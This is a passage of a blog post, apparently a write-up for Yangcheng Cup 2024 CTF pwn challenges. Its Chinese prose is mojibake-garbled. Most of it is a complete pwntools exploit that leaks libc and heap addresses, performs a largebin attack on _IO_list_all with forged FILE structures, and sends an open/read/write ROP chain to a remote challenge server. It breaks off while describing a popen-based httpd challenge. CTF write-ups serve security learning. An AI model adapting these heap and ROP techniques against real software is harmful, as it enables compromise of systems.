<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/4.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>ÂèØ‰ª•Áî±‰∫éaddÂáΩÊï∞ÂØπË∑ØÂæÑÁöÑÈïøÂ∫¶ÊúâÈôêÂà∂ÔºåÊâÄ‰ª•Ê≠£Â∏∏ÊÉÖÂÜµ‰∏ãËøô‰∏™Êù°‰ª∂ÊòØÊó†Ê≥ïÊª°Ë∂≥ÁöÑ<br>Ê±ÇËß£ÊÄùË∑Ø‰∏∫Âà©Áî®Â†ÜÈ£éÊ∞¥ÂêàÁêÜÊûÑÈÄ†Â†ÜÂùóËé∑Âèñ‰∏ÄÊ¨°<code>edit</code>Êú∫‰ºöÔºåÁÑ∂Âêé<code>largebin attack</code>Êâì<code>_IO_list_all</code>„ÄÇÁî±‰∫éËøôÈáåÂºÄÂêØ‰∫ÜÊ≤ôÁÆ±ÔºåÊâÄ‰ª•Êàë‰ª¨‰ΩøÁî®<code>orw</code>ËØªÂá∫flag„ÄÇËøôÈ¢òÁöÑÊ†àÂú∞ÂùÄËøúÁ®ãÂíåÊú¨Âú∞Êúâ <code>8</code> Â≠óËäÇÁöÑÂÅèÂ∑ÆÔºåÈÄÜÂ§©<br>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">        <span class="comment"># env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;139.155.126.78&#x27;</span>,<span class="number">34146</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">citys = [<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="string">b&#x27;fuzhou&#x27;</span>]</span><br><span class="line">trans = [<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;plane&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;distance.&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">tran,froms,tos,far,note</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;What kind of transportation do you want? car/train/plane?&#x27;</span>)</span><br><span class="line">    p.sendline(trans[tran])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(far))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">froms,tos</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[tos])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">djsk</span>(<span class="params">froms</span>):</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">    p.sendline(citys[froms])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21ace0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>),</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">8888</span>)+p32(<span class="number">2</span>)) <span class="comment"># 4</span></span><br><span class="line">djsk(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 8</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1461</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">large = libc_base + <span class="number">0x21b110</span></span><br><span class="line">heap = heap_base + <span class="number">0x2930</span></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input the city name&#x27;</span>)</span><br><span class="line">p.sendline(citys[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Which one do you want to change?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;How far?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Note:&#x27;</span>)</span><br><span class="line">target = libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target - <span class="number">0x100</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: target-<span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p64(large)*<span class="number">2</span>+p64(target-<span class="number">0x100</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>)+fake_io_read[<span class="number">0x30</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">meau(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line">target = stack - <span class="number">712</span> + <span class="number">8</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000016333a</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>ËøôÈ¢òÂÆûÁé∞‰∫Ü‰∏Ä‰∏™httpÊúçÂä°Âô®ÔºåÂÖ∂ÂäüËÉΩÊòØÂØπgetËØ∑Ê±ÇÁöÑË∑ØÂæÑËøõË°åËÆøÈóÆÔºåÂ¶ÇÊûúË∑ØÂæÑ‰ª•ÂèäÊñá‰ª∂ÂêàÊ≥ïÂ∞±‰ºöÊâìÂç∞Âá∫Êñá‰ª∂ÁöÑÂÜÖÂÆπ</p>
<img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/5.png" class="" title="ÊàëÁöÑÂõæÂõæÂë¢">  
<p>Â¶Ç‰∏äÂõæÊâÄÁ§∫ÔºåÁ®ãÂ∫èÂØπÊàë‰ª¨ËæìÂÖ•ÁöÑË∑ØÂæÑËøõË°å‰∫ÜÂçÅÂàÜ‰∏•Ê†ºÁöÑËøáÊª§ÔºåÊàë‰ª¨Êó†Ê≥ïÁõ¥Êé•Ëé∑Âèñ<code>/flag</code>ÁöÑÂÜÖÂÆπÔºåÂõ†‰∏∫‰ºöÁªôËøáÊª§ÊéâÔºåÂèØÊòØÊàëÊ≥®ÊÑèÂà∞‰∫Ü‰∏ãÈù¢Êúâ‰∏™<code>popen</code>ÂáΩÊï∞<br>ÂáΩÊï∞ÁöÑÂÆö‰πâÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">FILE * <span class="title function_">popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command , <span class="type">const</span> <span class="type">char</span> *type )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pclose</span><span class="params">(FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>ÂáΩÊï∞ËØ¥ÊòéÔºö</p>
<blockquote>
